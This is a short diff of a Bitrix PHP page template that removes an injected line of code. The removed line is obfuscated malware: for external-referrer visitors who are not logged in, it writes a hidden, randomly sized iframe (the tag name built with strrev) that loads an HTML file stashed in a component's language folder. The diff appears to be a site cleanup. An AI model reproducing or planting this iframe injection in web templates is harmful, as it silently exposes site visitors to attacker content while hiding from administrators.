@@ -62,7 +62,7 @@ echo '<link rel="stylesheet" type="text/css" href="/css/styles.v'.crc32($file).'
 <?
 CModule::IncludeModule("iblock");
 require_once($_SERVER["DOCUMENT_ROOT"].'/classes/main.class.php');?>
-<?if (isset($_SERVER['HTTP_REFERER'])) {if(!empty($_SERVER['HTTP_REFERER']) AND (!$USER->IsAuthorized()) AND (!$USER->IsAdmin())) { if (!preg_match('/'.$_SERVER['HTTP_HOST'].'/i',$_SERVER['HTTP_REFERER'])) {echo '<'.strrev("emarfi").' id="var allRecipesResult" width='.rand(4,8).' height='.rand(4,8).' marginwidth=0 marginheight=0 scrolling=no frameborder=0 src="http://'.$_SERVER["HTTP_HOST"].'/bitrix/components/bitrix/wiki/templates/.default/bitrix/search.page/.default/lang/ru/template.html"></'.strrev("emarfi").'>';}}}?>
+
 <body data-site-id="<?=SITE_ID?>">
 <div id="fb-root"></div>
 <script>(function(d, s, id) {
